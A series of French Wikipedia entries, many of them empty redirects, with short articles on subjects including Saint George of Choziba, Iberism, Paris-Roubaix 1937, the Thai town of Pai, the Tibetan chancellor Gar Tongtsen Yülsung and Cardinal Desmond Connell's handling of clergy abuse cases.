<doc id="2845528" url="https://fr.wikipedia.org/wiki?curid=2845528" title="Aimé de Mont-Cassin">
Aimé de Mont-Cassin



</doc>
<doc id="2845532" url="https://fr.wikipedia.org/wiki?curid=2845532" title="Georges de Choziba">
Georges de Choziba

Saint Georges de Choziba ou saint Georges de Chozéba est un saint du , fêté le 8 janvier par l'Église catholique et l'Église orthodoxe. 
Biographie.
Le futur saint Georges est né au milieu du dans une famille pieuse de Chypre. Après la mort de ses parents, il quitte l'île et se rend en Terre sainte où est déjà installé son frère aîné Héraclide, qui y mène une vie érémitique et ascétique. Trop jeune pour mener la même vie, le futur Saint est conduit par son frère au alors appelé monastère de la Mère de Dieu. Là, il est tonsuré moine et sa formation spirituelle est confiée à un ancien du monastère, très sévère. Saint Georges accepte tout avec patience et grande humilité. Un jour, son maître spirituel, furieux contre lui, lui donna un violent soufflet devant les autres frères, mais sa main se dessécha alors immédiatement et c'est grâce aux prières de saint Georges qu'il en retrouvera l'usage par la suite. 
Cependant, désireux d'échapper à l'admiration et aux louanges de ses frères, le Saint quitta le monastère et retourna auprès de son frère, à Calamon. Il partagea la même cellule que lui et ils y menèrent une vie de grande prière et d'ascèse. Après la mort de son frère, saint Georges continua sa vie sainte de prière et il acquit une telle grâce de Dieu qu'il obtint le don de faire des miracles. 
Mais le monastère de Chozéba fut par la suite victime de tensions, et saint Georges le regagna à l'appel de Dieu. Il y mena une vie recluse et ne rejoignait les autres moines que le dimanche, pour les aider dans leurs labeurs spirituels. En 614, le Saint prédit que Jéricho serait conquise par les Perses, et Jérusalem assiégée. 
Les frères partirent se réfugier ailleurs mais le Saint accepta avec beaucoup de réticences de se réfugier à Calamon. Les envahisseurs massacrèrent beaucoup de moines mais impressionnés par saint Georges, ils le laissèrent libre, et il retourna alors à Choziba. Grâce à ses prières, on rapporte que le monastère ne manqua jamais de nourriture alors que toute la région était soumise à la famine. 
Ayant prédit le moment de sa mort, saint Georges appela son disciple Antoine à son chevet puis rendit l'âme.
Sa vie sera écrite par son disciple Antoine.
De nombreux Saints vivront au cours des siècles dans le monastère de saint Georges. C'est notamment dans ce monastère que sera ordonné prêtre saint Sabas de Kalymnos.
Sources et références.
"Parole et Prière" numéro 67 de page 95 

</doc>
<doc id="2845541" url="https://fr.wikipedia.org/wiki?curid=2845541" title="Pachôme">
Pachôme



</doc>
<doc id="2845544" url="https://fr.wikipedia.org/wiki?curid=2845544" title="Site web de cuisine">
Site web de cuisine

Un site web de cuisine est un site qui donne de l'information sur la cuisine en général et qui, pour l'essentiel, publie des recettes de cuisine.
Il faut distinguer les sites web de cuisine suivant leur finalité : 
Informations et divertissements.
Pour l'internaute, le site web de cuisine est le plus souvent un site de divertissement, d'information et d'échange de savoir. De nombreuses recettes par exemple sont proposées avec des variations, des « trucs et astuces », de nouvelles idées toujours en extension. Mais chacun peut aussi profiter des sites commerciaux sur lesquels les qualités et les prix des différents produits peuvent être comparés, produits qui peuvent aussi être réservés ou commandés pour se les faire livrer.
Le contenu traditionnel des magazines et des journaux spécialisés dans les arts culinaires et, il faut bien le dire, leurs écrans publicitaires, sont le plus souvent repris : recettes bien sûr, mais aussi articles et documentaires sur les produits de saison et du terroir, les fromages, l'œnologie, les vins, spiritueux et cocktails, les cuisines régionales et les recettes exotiques du monde, les modes de cuisson, la cuisine diététique, le bien-être et la santé, la décoration, les menus, les bonnes adresses, l'actualité et la littérature culinaire. Les fonctions offertes par le web sont adaptées et enrichissent les thèmes abordés profitant de l'instantanéité de la publication, l'inter-activité des pages et des possibilités audio et vidéo de la toile. Par l'intermédiaire de son site web, un cuisinier peut expliquer en détail la réalisation d'un plat grâce à une série de photographies ou de vidéo souvent plus explicites qu'un texte. Les internautes ont aussi la possibilité de poser des questions sur une recette, de la commenter et même de la critiquer en y apportant son expérience ou son talent. Le web permet aussi à chacun de prendre la place du cuisinier et d'exposer ses propres recettes avec des outils de communication de plus en plus élaborés. Certains grands chefs, comme Alain Ducasse, vont jusqu'à mettre en ligne certains cours de leur école de cuisine ou d'œnologie. 
Les principaux guides gastronomiques ("Guide Michelin", "Gault et Millau"... ) et beaucoup de magazines de cuisines ("Guide Cuisine" ou "Cuisine Actuelle") ont depuis peu leurs pages web qu'ils développent progressivement en sites spécialisés et de ventes par correspondance. Une revue généraliste comme "Elle" a créé le site web consacré à la cuisine "Elle, à table", où sont détaillés et traités tous les thèmes culinaires comme "« fiches cuisine, menus de chefs, menus de stars, cuisine du placard, cuisine minceur, idées de menus, que faire avec, adresses gourmandes, côté cave, vidéos, cuisine recettes faciles, cuisine du monde, desserts, cocktails, restaurants… »"
L'émission "Un dîner presque parfait" et son pendant "Top Chef" sur M6 sont aussi exemplaires avec leur site web de cuisine présentant l'émission, les candidats, les jurys, mais aussi des recettes, des jeux et des quiz, des photos, des vidéos, des reportages.
Généralement, chaque site web de cuisine possède son forum où tout le monde peut s'exprimer.
Éditeurs.
Il existe trois grandes familles d'éditeurs de sites web de cuisine :

</doc>
<doc id="2845545" url="https://fr.wikipedia.org/wiki?curid=2845545" title="Kanaal Twee">
Kanaal Twee



</doc>
<doc id="2845552" url="https://fr.wikipedia.org/wiki?curid=2845552" title="Rosny sur Seine">
Rosny sur Seine



</doc>
<doc id="2845553" url="https://fr.wikipedia.org/wiki?curid=2845553" title="Livre blanc pour la Palestine">
Livre blanc pour la Palestine



</doc>
<doc id="2845558" url="https://fr.wikipedia.org/wiki?curid=2845558" title="Ibérisme">
Ibérisme

L'ibérisme est un mouvement politique et culturel qui défend le rapprochement et l'amélioration des relations à tous les niveaux entre l'Andorre, l'Espagne et le Portugal (les Ibères) et, en dernier lieu, leur union politique. 
Initialement, il fut essentiellement promu par les mouvements républicains et socialistes d’Espagne et Portugal, particulièrement durant le , lorsque les projets nationalistes intégrateurs, tels que le italien ou l'Unité allemande, connurent un écho favorable. Le "Diccionario de la lengua española" (dictionnaire de la langue espagnole) définit comme « une doctrine qui prône l'union politique ou un plus grand rapprochement de l'Espagne et du Portugal ». Elle entre en concurrence avec les récits de construction nationale de l'Espagne et du Portugal.
L'ibérisme se diffère du panibérisme dans la mesure où, alors que l'ibérisme concerne strictement les territoires péninsulaires, le panibérisme inclut les territoires qui ont été historiquement liés aux deux principales cultures ibériques : les Espagnols et les Portugais ; incluant ainsi une grande partie du continent américain, ainsi que des territoires en Afrique et en Asie, dans cet ordre.
Historique.
Géographie et culture.
Le Portugal et l'Espagne partagent une unité géographique qui se manifeste par une longue frontière commune (1214 km), par le passage de fleuves importants (Minho, Douro, Tage, Guadiana), par le même climat, par la même économie rurale qui produit les mêmes aliments : huile d'olive, vin, céréales, légumineuses, viande... ; par la même utilisation de la terre avec une base romaine et arabe, ou par le même type de société liée à la région ou à la vallée d'origine.
En outre, les deux pays partagent une histoire, parfois commune, parfois parallèle, avec une évolution cohérente et différenciée du reste de l'Europe. De la domination romaine, wisigothique et arabe à la formation des royaumes chrétiens médiévaux et à l'idéal commun de la Reconquête, fondé sur le double objectif de l'expulsion de l'Islam et de l'unification des royaumes sous une seule couronne, en passant par l'âge des découvertes, l'union dynastique "aeque principalite"r des trois couronnes de la péninsule ibérique sous un même souverain de la Maison d'Autriche, la guerre d'indépendance espagnole (appelée guerre péninsulaire au Portugal), la quadruple alliance (1834) contre les guerres carliste et migliste, le pacte ibérique (1942), et enfin l'entrée des deux pays dans l'Union européenne. 
La langue portugaise, parlée par plus de 200 millions de personnes dans le monde, est très proche de l'espagnol, parlé par plus de 500 millions de personnes dans le monde. Tous deux ont une similarité lexicale de 89%, plus que l'espagnol avec le catalan (85 %), l'italien (82 %) ou le français (75 %). De plus, le portugais partage d'énormes similitudes avec le galicien, puisqu'ils proviennent de la même langue médiévale, le galaïco-portugais.
Sous l'Ancien Régime, les tentatives d'union ibérique sont nées de la politique matrimoniale encouragée entre la maison portugaise d'Avís et la maison de Trastámara, puis la maison de Habsbourg du côté espagnol.
À la suite de la mort du roi de Portugal en , son neveu, le roi d'Espagne , fils d' et donc petit-fils du roi de Portugal , affirme sa prétention au trône portugais, son armée bat son rival Antonio, prieur de Crato, à la bataille d'Alcantara et assure la succession en se proclamant roi en septembre. est finalement reconnu comme roi du Portugal aux Cortes de Tomar (1581), qui établissent l'intégration du royaume de Portugal dans la monarchie espagnole. Ainsi, le royaume de Portugal a été intégré dans le système polisinodial dans lequel le Conseil du Portugal était l'organe de médiation et de négociation de l'orientation des décisions du monarque espagnol concernant les questions relatives au royaume de Portugal.
Cependant, les guerres du monarque espagnol en Europe affectent les territoires portugais et le commerce dans ses territoires d'outre-mer, et l'interventionnisme de la Castille dans les affaires portugaises, notamment financières, conduit à une rébellion qui met sur le trône le duc de Bragance, proclamé roi . Finalement, le traité de Lisbonne (1668) met fin à la guerre et l'Espagne reconnaît l'indépendance du Portugal. Dès lors, l'Espagne et le Portugal se comportent de manière antagoniste.

</doc>
<doc id="2845559" url="https://fr.wikipedia.org/wiki?curid=2845559" title="Panibérisme">
Panibérisme



</doc>
<doc id="2845560" url="https://fr.wikipedia.org/wiki?curid=2845560" title="Paniberismo">
Paniberismo



</doc>
<doc id="2845562" url="https://fr.wikipedia.org/wiki?curid=2845562" title="Iberismo">
Iberismo



</doc>
<doc id="2845563" url="https://fr.wikipedia.org/wiki?curid=2845563" title="Franz Ludwig von Welden">
Franz Ludwig von Welden

Franz Ludwig baron von Welden, né le à Laupheim, dans le Bade-Wurtemberg, en Allemagne et mort le à Graz, est un général de l'armée autrichienne, qui fut le commandant en chef de l'artillerie autrichienne.
Biographie.
Ludwig von Welden rejoint l'armée du duché de Wurtemberg en 1798, prenant part à la guerre contre la révolution française (1799-1800). En 1802, il passe au service de l'Autriche et est fait prisonnier de guerre par les Français en 1809. À la suite d'un échange de prisonniers, il prend part à la bataille d'Essling.
En 1812, il entre à l'état-major du prince Karl Philipp de Schwarzenberg. Après avoir été promu au grade de lieutenant-colonel, Ludwig von Welden se distingue comme officier d'état-major en Italie en 1814 et, après la prise de Mantoue, se voit confier la tâche de rapatrier l'armée française qui a capitulé vers le sud France. En 1815, Ludwig von Welden est officier de l'état-major de l'armée et affronte Joachim Murat qui essaie de conserver son royaume de Naples. Au cours de cette campagne, il est promu au grade de colonel et, en 1816, à celui de général de brigade du Génie.
Le général von Welden devient chef du bureau topographique des armées et sert pendant la campagne du Piémont en 1821 en tant que chef de l'état-major. Il supervise également l'étude topographique de la région. En 1824, il publie une monographie sur le mont Rose.
De 1832 à 1838, il est délégué à la commission militaire centrale de la Confédération germanique à Francfort. Ayant été promu au rang de feldmarschall-Leutnant, il prend le commandement d'une division à Graz en 1838, et, en 1843, il assume le commandement général du Tyrol. Pendant la soulèvement de Lombardie en 1848, il réussit à obtenir du général Joseph Radetzky la création de lignes de communication avec l'Autriche et participe à l'occupation de Venise.
En septembre 1848, Ludwig von Welden est nommé gouverneur militaire et civil de la Dalmatie puis il occupe ce même poste à Vienne après la révolution de 1848.
Après l'échec du prince de Windisch-Graetz à réprimer les mouvements révolutionnaires en Hongrie, Ludwig van Welden est nommé au commandement suprême de l'armée autrichienne en Hongrie en avril 1849. Toutefois, après la conquête de Buda, en mai, il est remplacé par le général-baron Julius Jacob von Haynau. Il retourne à Vienne y reprendre son poste de gouverneur, après avoir été promu au deuxième plus haut grade dans l'armée autrichienne, celui de .
En raison de sa santé défaillante, Ludwig von Welden prend sa retraite du service actif en 1851. Il meurt à Graz en 1853.

</doc>
<doc id="2845565" url="https://fr.wikipedia.org/wiki?curid=2845565" title="Ludwig von Welden">
Ludwig von Welden



</doc>
<doc id="2845566" url="https://fr.wikipedia.org/wiki?curid=2845566" title="GfA Basic">
GfA Basic



</doc>
<doc id="2845570" url="https://fr.wikipedia.org/wiki?curid=2845570" title="Tanysiptera galatea">
Tanysiptera galatea



</doc>
<doc id="2845571" url="https://fr.wikipedia.org/wiki?curid=2845571" title="Jean de Vert">
Jean de Vert



</doc>
<doc id="2845572" url="https://fr.wikipedia.org/wiki?curid=2845572" title="Jean-de-Vert">
Jean-de-Vert



</doc>
<doc id="2845573" url="https://fr.wikipedia.org/wiki?curid=2845573" title="Martin-chasseur à longs brins">
Martin-chasseur à longs brins

Le Martin-chasseur à longs brins ("Tanysiptera galatea") est une espèce d'oiseaux de la famille des Alcedinidae.
Description.
Les Tanysiptera différent des autres marin-chasseurs présents sur leurs aires (Nouvelle-Guinée, Nouvelle-Bretagne et nord-est de l'Australie) par leurs plumes rectrices centrales allongées.

</doc>
<doc id="2845575" url="https://fr.wikipedia.org/wiki?curid=2845575" title="Paris-Roubaix 1937">
Paris-Roubaix 1937

La de la course cycliste Paris-Roubaix a eu lieu le et a été remportée par l'Italien Jules Rossi.
Parcours.
Cette édition, longue de , part d'Argenteuil. La course passe par Pontoise, Méru, Beauvais, Breteuil, Amiens, Doullens, Arras, Hénin-Liétard, Seclin. Elle arrive à Roubaix, avenue Gustave-Delory.
Participants.
181 coureurs sont engagés sur ce Paris-Roubaix. 78 s'entre eux sont Belges, 76 Français, 9 Néerlandais, 8 Italiens, 5 Suisses, 2 Luxembourgeois, 2 Allemands et un Espagnol. 159 coureurs prennent le départ de la course.
Déroulement de la course.
Aux alentours de Pontoise, Fernand Mithouard s'échappe. Rattrapé par le peloton, il repart avec Joseph Moerenhout, François Blin, Maurice Archambaud, Gustave Danneels, François Passat et Antoine van Schendel. À Beauvais, ce groupe compte quatre minutes d'avance sur le peloton. Plusieurs coureurs s'échappent de ce dernier et parviennent à rejoindre la tête de la course. Dix coureurs sont en tête à Doullens.
Après le passage à Arras, Félicien Vervaecke s'échappe seul. Après vingt kilomètres, sept coureurs le rattrapent, puis le dépassent : Gustave Danneels, Albert Hendrickx, Noël Declercq, Aimé Lievens, Emiel Vandepitte, Severin Vergili et Jules Rossi. Ces coureurs sont rejoints par un autre coureur italien, César Moretti, distancé ensuite à cause d'une crevaison et d'une chute. Rossi attaque mais est retenu par les barrières d'un passage à niveau à Lesquin et voit revenir les coureurs, à l'exception de Danneels et Vergili qui ne sont pas parvenus à suivre.
Arrivé sur l'avenue Rossi devance au sprint les quatre coureurs belges qui l'accompagnent. Âgé de 23 ans, il est le premier coureur italien à remporter Paris-Roubaix.

</doc>
<doc id="2845576" url="https://fr.wikipedia.org/wiki?curid=2845576" title="Paris-Roubaix 1938">
Paris-Roubaix 1938

La de la course cycliste Paris-Roubaix a eu lieu le et a été remportée par le Belge Lucien Storme.

</doc>
<doc id="2845583" url="https://fr.wikipedia.org/wiki?curid=2845583" title="Bradford County">
Bradford County



</doc>
<doc id="2845586" url="https://fr.wikipedia.org/wiki?curid=2845586" title="Ibérique">
Ibérique

Ibérique ("" en espagnol et en portugais), est l’adjectif faisant référence à la péninsule Ibérique mais aussi, de manière élargie, aux pays culturellement et historiquement liés à l'Espagne et/ou au Portugal. On le retrouve dans les expressions suivantes :

</doc>
<doc id="2845587" url="https://fr.wikipedia.org/wiki?curid=2845587" title="Ibérico">
Ibérico



</doc>
<doc id="2845588" url="https://fr.wikipedia.org/wiki?curid=2845588" title="Iberico">
Iberico



</doc>
<doc id="2845589" url="https://fr.wikipedia.org/wiki?curid=2845589" title="Iberique">
Iberique



</doc>
<doc id="2845590" url="https://fr.wikipedia.org/wiki?curid=2845590" title="Bradford (West Yorkshire)">
Bradford (West Yorkshire)



</doc>
<doc id="2845594" url="https://fr.wikipedia.org/wiki?curid=2845594" title="Bfd">
Bfd



</doc>
<doc id="2845595" url="https://fr.wikipedia.org/wiki?curid=2845595" title="BFD">
BFD

BFD peut faire référence à :

</doc>
<doc id="2845596" url="https://fr.wikipedia.org/wiki?curid=2845596" title="Pai (Thaïlande)">
Pai (Thaïlande)

Pai (thaï ปาย) est une petite ville du nord de la Thaïlande située dans la province de Mae Hong Son, entre Chiang Mai et Mae Hong Son.
Ville brumeuse proche de la frontière birmane, à environ au-dessus du niveau de la mer, Pai est entourée par de hautes montagnes. De nombreux groupes ethniques différents y mènent encore une vie traditionnelle paisible. La rivière Pai traverse la ville et la forêt avant de passer en Birmanie.
Population.
Elle est principalement Thaï-Yao (également présents dans l'état Shan, en Birmanie) et de populations des collines. En ville principalement thaïs, Thaï-Chinois, quelques Thaï-Musulmans et quelques résidents étrangers.
Économie.
Elle vie essentiellement du tourisme : tout est adapté pour les étrangers. En 2024, Paï a accueilli près de 220 000 touristes. 
Elle est aussi agricole : riz, fruits, lychee, coton.
Climat.
Saison fraîche : 12 de novembre à mars
Saison chaude : 24 d'avril à juin 
Saison des pluies : 24 de juillet à septembre
Tourisme.
Monuments bouddhistes.
Ce temple se situe dans la région de Wiang Tai, proche de la station de bus. En son centre se trouve un grand chédi de style Thaï entouré par de petits chédis. 
Le Wat Nam Hu se trouve à environ 3 kilomètres du marché de Pai. Il abrite une statue de Bouddha de de large et 76 de haut pouces de longueur. En haut de l’image se trouve l’eau sainte que les habitants respectent. 
Le Phra That Mae Yen est situé au sommet d'une petite éminence. Depuis le centre de Pai, il y a 30 minutes de marche pour y arriver - jolie vue sur la ville et son site.
À proximité.
Ce village Lisu est l’un des plus célèbres endroits de la vie traditionnelle et où se trouve la maison de Yao. 
C'est une des plus belles cascades de Pai, avec plusieurs niveaux formant comme des gradins. Elle se trouve à environ 7 kilomètres du centre de Pai.
Activités.
Pai est une petite ville mais possède de bons équipements tels que le service de poste, d'hôpital, d'appel de fond et de fax. Le logement et la nourriture sont bons et bon marché. Il existe des restaurants locaux et occidentaux, avec du pain fait maison.
Culture.
Les Thaïs locaux et Yao conservent leurs traditions, par exemple : les vêtements traditionnels, le style de maison, la nourriture et aussi la fête.
Quelques fêtes :

</doc>
<doc id="2845600" url="https://fr.wikipedia.org/wiki?curid=2845600" title="Gar Tongtsen Yülsung">
Gar Tongtsen Yülsung

Gar Tongtsen Yülsung, (), appelé en chinois Lu Dongzan () ou Lun Dongzan (), né en 590 et décédé en 667, fut Lönchen (chancelier et général) de l'Empire du Tibet (royaume de Pugyäl/Tubo) de 632 ou 633 à sa mort, sous les règnes de Songtsen Gampo, Gungri Gungtsen et Mangsong Mangtsen. Il exerça une régence de fait à partir de 650 en raison du jeune âge des souverains. On lui attribue les réformes et différentes victoires militaires de l’époque, qui permirent l'expansion de l’empire tibétain ainsi que son propre clan, le clan Gar ( ; chinois : ), principal soutien et codétenteur du pouvoir jusqu’à la fin du . Il passa les dernières années de sa vie sur le territoire du royaume des Tuyuhun (tibétain : 'A-zha), situé sur une partie des actuelles provinces de Qinghai, Sichuan et Gansu) qu'il conquis avec les troupes tibétaines en 663.
Une statue le représente dans une chapelle du palais du Potala, à côté de celles du roi du Tibet Songtsen Gampo et de ses deux épouses, la princesse Wencheng, chinoise, et la princesse Bhrikuti, népalaise.
Son fils aîné, Gar Tsenye Dompu, lui succède au titre de lönchen.
Carrière.
Il mène au cours de sa vie des campagnes couronnées de succès contre Zhangzhung, le royaume Xianbei d'A-zha,(conquis en 663 après quatre ans de campagne), les Qiangs, les Tangoutes et l’empire Tang, assisté de ses fils, dont on connaît le nom chinois de Qizeng (chinois : ) et Gar Trinring Tsendro ( ; chinois : ).
Il joue aussi un rôle d’ambassadeur et obtient pour Songtsen Gampo des alliances matrimoniales avec le Népal (639?, princesse Bhrikuti) et la Chine (641, Princesse Wencheng à Songzhou). À cette occasion, l'empereur Taizong qui reconnait en lui un adversaire de valeur le nomme général () et tente de le retenir à son service par une alliance qu’il décline.
À sa mort, ses fils et petit-fils Khri-'bring et Zanpo (, nom chinois) reprennent la régence et le contrôle des opérations militaires, étendant la puissance du Tibet dans les possessions chinoises du bassin du Tarim- royaume du Khotan et Aksou en particulier.
Légende.
En 640, une ambassade menée par Gar Tongtsen Yülsung se rendit à Chang'an en Chine et obtint de l’empereur Tang Taizong une alliance matrimoniale avec une de ses parentes, la princesse Wencheng. Une légende tibétaine évoque la difficulté de l’entreprise en inventant des épreuves en nombre variable que le chancelier surmonte grâce à son intelligence. En voici une version :
De nombreux ambassadeurs étant venus solliciter la main de la princesse, l’empereur de Chine décida de proposer trois épreuves aux candidats.
On leur présenta tout d’abord dix troncs d’arbre coupés, aux extrémités identiques, en leur demandant de quel côté se trouvaient les racines. Gar Tongtsen Yülsung fit tremper les troncs dans l’eau. Il savait en effet que l’extrémité basse est plus lourde que l’autre, et put donner la bonne réponse en observant les troncs s’incliner dans l’eau.
L’empereur fit alors remettre aux ambassadeurs une pierre de jade percée d’un trou en zigzag et leur demanda d’y passer un fil. Tongtsen Yülsung enduisit de miel l’une des extrémités de l’orifice et déposa à l’autre une fourmi ceinturée par un fil. Attirée par le miel et aidée par le souffle du chancelier, la fourmi atteignit l’autre extrémité et le pendentif fut prêt à être porté.
Enfin, les ambassadeurs furent menés devant une écurie abritant cent juments et cent poulains. Il leur fut demandé d’apparier chaque jeune avec sa mère. Tongtsen Yülsung fit séparer une nuit durant les femelles et les jeunes. Le lendemain matin, il laissa sortir les juments une à une. Chaque poulain s’avança pour téter en voyant apparaître sa propre mère, et les couples furent ainsi reconstitués.
Bien entendu, l’empereur n’allait pas lâcher si facilement sa précieuse princesse et soumit Gar Tongtsen Yülsung à une ultime épreuve : l’identifier parmi cinq cents jeunes filles voilées. Mais l’ambassadeur s’était renseigné et connaissait le parfum préféré de la princesse, apprécié également des abeilles. Elles l’aidèrent donc à la retrouver.
L’empereur Taizong en conclut que le roi de Tubo, sachant choisir des hommes de talent pour l’assister, méritait sans nul doute de devenir gendre impérial.

</doc>
<doc id="2845601" url="https://fr.wikipedia.org/wiki?curid=2845601" title="Gar Songtsen">
Gar Songtsen



</doc>
<doc id="2845606" url="https://fr.wikipedia.org/wiki?curid=2845606" title="Deutsche Eishockey-Liga">
Deutsche Eishockey-Liga



</doc>
<doc id="2845608" url="https://fr.wikipedia.org/wiki?curid=2845608" title="BFE">
BFE

BFE peut faire référence à :

</doc>
<doc id="2845609" url="https://fr.wikipedia.org/wiki?curid=2845609" title="Bfe">
Bfe



</doc>
<doc id="2845611" url="https://fr.wikipedia.org/wiki?curid=2845611" title="Latvijas Atklātais čempionāts">
Latvijas Atklātais čempionāts



</doc>
<doc id="2845613" url="https://fr.wikipedia.org/wiki?curid=2845613" title="Superisligaen">
Superisligaen



</doc>
<doc id="2845614" url="https://fr.wikipedia.org/wiki?curid=2845614" title="Khan kluay">
Khan kluay



</doc>
<doc id="2845615" url="https://fr.wikipedia.org/wiki?curid=2845615" title="Österreichische Eishockey-Liga">
Österreichische Eishockey-Liga



</doc>
<doc id="2845616" url="https://fr.wikipedia.org/wiki?curid=2845616" title="GET ligaen">
GET ligaen



</doc>
<doc id="2845617" url="https://fr.wikipedia.org/wiki?curid=2845617" title="Ekstraklasa">
Ekstraklasa

En sport, l'Ekstraklasa désigne généralement en Pologne la compétition de niveau le plus élevé.

</doc>
<doc id="2845618" url="https://fr.wikipedia.org/wiki?curid=2845618" title="Vyschchiy Dyvision">
Vyschchiy Dyvision



</doc>
<doc id="2845619" url="https://fr.wikipedia.org/wiki?curid=2845619" title="BFF">
BFF

 
BFF peut faire référence à : 

</doc>
<doc id="2845621" url="https://fr.wikipedia.org/wiki?curid=2845621" title="Bff">
Bff



</doc>
<doc id="2845623" url="https://fr.wikipedia.org/wiki?curid=2845623" title="Bhutan Football Federation">
Bhutan Football Federation



</doc>
<doc id="2845624" url="https://fr.wikipedia.org/wiki?curid=2845624" title="Fédération du Bhoutan de Football">
Fédération du Bhoutan de Football



</doc>
<doc id="2845626" url="https://fr.wikipedia.org/wiki?curid=2845626" title="Léiomyocyte">
Léiomyocyte



</doc>
<doc id="2845629" url="https://fr.wikipedia.org/wiki?curid=2845629" title="Ach, ich fühl's, es ist verschwunden!">
Ach, ich fühl's, es ist verschwunden!

 (littéralement "Ah, je le sens, elle est évanouie !") est l'air chanté par Pamina, la fille de la Reine de la Nuit, rôle de soprano, dans l'opéra de Mozart "la Flûte enchantée".
L'air.
Cet air chanté par Pamina sert à illustrer la tristesse du personnage : en effet, Tamino a refusé de lui adresser la parole. Elle pense donc qu'il ne l'aime plus.
La vérité, c'est que Tamino passe l'épreuve du silence. Il n'est pas autorisé à parler aux femmes, et donc à Pamina.
La musique.
La musique décrit le chagrin que ressent Pamina à l'idée que Tamino n'est plus amoureux d'elle.
Le texte.
Le texte est tiré du livret en allemand de l'ami de Mozart, Emanuel Schikaneder, qui jouait aussi le rôle de Papageno lors de la première représentation.

</doc>
<doc id="2845636" url="https://fr.wikipedia.org/wiki?curid=2845636" title="Bfi">
Bfi



</doc>
<doc id="2845637" url="https://fr.wikipedia.org/wiki?curid=2845637" title="Palais Bhubing">
Palais Bhubing

Le Palais Bhubing est la résidence royale d’hiver thaïlandaise où la famille royale séjourne pour se reposer et rendre visite au peuple du nord de la Thaïlande. C'est aussi une maison d’hôte pour les visiteurs royaux.
Description.
Le Palais Bhubing est situé dans le district Doi Buak Ha, dans la province de Chiang Mai. Il a été construit en 1961. Au début, il n’y avait que le bâtiment de la résidence royale et la maison d’hôte. L’autre bâtiment fut ajouté plus tard.
Phra Tamnak Bhubing Rajanives a été construit en style thaï du nord nommé “Ruen Mu” (le groupe de maisons). Le bâtiment est construit sur pilotis. À l’étage se trouve la résidence royale ; le rez-de-chaussée est la résidence de l’entourage royal. 
Le palais comprend de nombreux bâtiments :

</doc>
<doc id="2845638" url="https://fr.wikipedia.org/wiki?curid=2845638" title="Le Palais Bhupin">
Le Palais Bhupin



</doc>
<doc id="2845639" url="https://fr.wikipedia.org/wiki?curid=2845639" title="Leiomyocyte">
Leiomyocyte



</doc>
<doc id="2845640" url="https://fr.wikipedia.org/wiki?curid=2845640" title="Desmond Connell">
Desmond Connell

Desmond Connell, né le à Dublin en Irlande et mort le dans la même ville, est un cardinal irlandais, archevêque de Dublin de 1988 à 2004.
Il est l'un des nombreux hauts responsables du clergé à avoir été fortement critiqués pour leur inaction, leurs déclarations trompeuses et leur dissimulation des abus sexuels commis par des religieux à Dublin.
Biographie.
Connell est né à Dublin le 24 mars 1926, fils de John, fonctionnaire et de Mary Lacy, opératrice téléphonique.
Il fait ses études à l'École nationale Saint-Pierre de Phibsborough et à l'école secondaire des Pères Jésuites, le , et étudie pour le sacerdoce au à Dublin.
Il étudie ensuite les arts à l'University College Dublin et est diplômé en 1946. Il obtient une maîtrise l'année suivante.
Entre 1947 et 1951, il étudie la théologie au St Patrick's College de Maynooth pour obtenir un baccalauréat en théologie.
Il poursuit ses études à l'université catholique de Louvain, en Belgique, où il obtient un doctorat en philosophie en 1953.
En 1981, il obtient un doctorat en lettres à l'université nationale d'Irlande.
Prêtre.
Desmond Connell est ordonné prêtre le pour le diocèse de Dublin.
Il enseigne la métaphysique à Université de Dublin avant de devenir doyen de la faculté de philosophie et de sociologie en 1983.
Il exerce également son ministère sacerdotal comme aumônier pour des congrégations religieuses.
Évêque.
Nommé archevêque de Dublin le 21 janvier 1988, il a été consacré le 6 mars suivant par Gaetano Alibrandi avec comme co-consécrateurs et .
Il a assumé cette charge jusqu'au 26 avril 2004, date à laquelle il se retire pour raison d'âge.
Cardinal.
Jean-Paul II le crée cardinal lors du consistoire du avec le titre de cardinal-prêtre de "San Silvestro in Capite" rattaché à la basilique San Silvestro in Capite.
Il participe au conclave de 2005 (élection de Benoît XVI) mais perd sa qualité d'électeur le 24 mars 2006, date de son . Il ne participe donc pas aux votes du conclave de 2013 (élection de François).
Traitement des cas d'abus sexuels.
La bienveillance de cet archevêque à l'égard de nombreux prêtres de son diocèse qui se sont rendus coupables d'abus sexuels a été pointée (27 novembre 2009, Commission Gouvernementale d'enquête en matière d'abus sexuels perpétrés par des ecclésiastiques).
En 1996, Connell refuse d'aider Marie Collins, victime de et n'en infirme pas la police. Il s'en excuse six ans plus tard, en avril 2002.
En octobre 2002, le programme , sur la RTÉ, détaille des cas d'. L'incapacité de Connell à lutter de manière adéquate contre les abus fait alors l'objet de vives critiques.
Le gouvernement irlandais lance la en mars 2006 pour enquêter sur cette affaire.
En 2009, le rapport Murphy révèle que Connell avait « été lent à reconnaître la gravité de la situation lorsqu'il a pris ses fonctions en 1988. Il comptait trop sur les conseils d'autres personnes, notamment de ses évêques auxiliaires et d'experts juridiques et médicaux. Manifestement personnellement consterné par ces abus, mais il lui a fallu un certain temps pour se rendre compte qu'on ne pouvait pas y remédier en gardant le secret et en protégeant les prêtres des procédures civiles normales".
Cependant, il est félicité pour avoir mis les archives archidiocésaines à la disposition des autorités en 2002 et pour ses actions en 1995 en donnant aux autorités les noms de 17 prêtres accusés d'abus, mais la liste était incomplète, car des plaintes ont été déposées contre au moins 28 prêtres dans l'archidiocèse.
Le rapport révèle également qu'à partir de 1988, Connell avait continué à assurer son archidiocèse contre la responsabilité des plaignants, mais avait affirmé à la Commission Murphy que l'archidiocèse était « sur une courbe d'apprentissage » en ce qui concerne la maltraitance des enfants.
Il a également fait en sorte que les indemnités soient versées à partir d'un « Stewardship Trust » (fonds d'intendance), gardé secret jusqu'en 2003.
Succession apostolique.
Desmond Connell a ordonné les évêques suivants :

</doc>
<doc id="2845641" url="https://fr.wikipedia.org/wiki?curid=2845641" title="Résidence Wimanmek">
Résidence Wimanmek

La résidence Wimanmek ( - RTGS : wimanmek), parfois orthographié Vimanmek est un ancien palais royal situé dans le domaine royal de Dusit à Bangkok en Thaïlande. C'est la plus grande résidence en teck du monde.
En 2019, la résidence Wimanmek est démontée du domaine royal de Dusit.
Histoire.
Après son voyage en Europe en 1897, le roi Rama V a acheté les vergers et les champs entre le canal Padung Krungkasem et le canal Samsan pour construire le jardin royal appelé le Jardin Dusit.
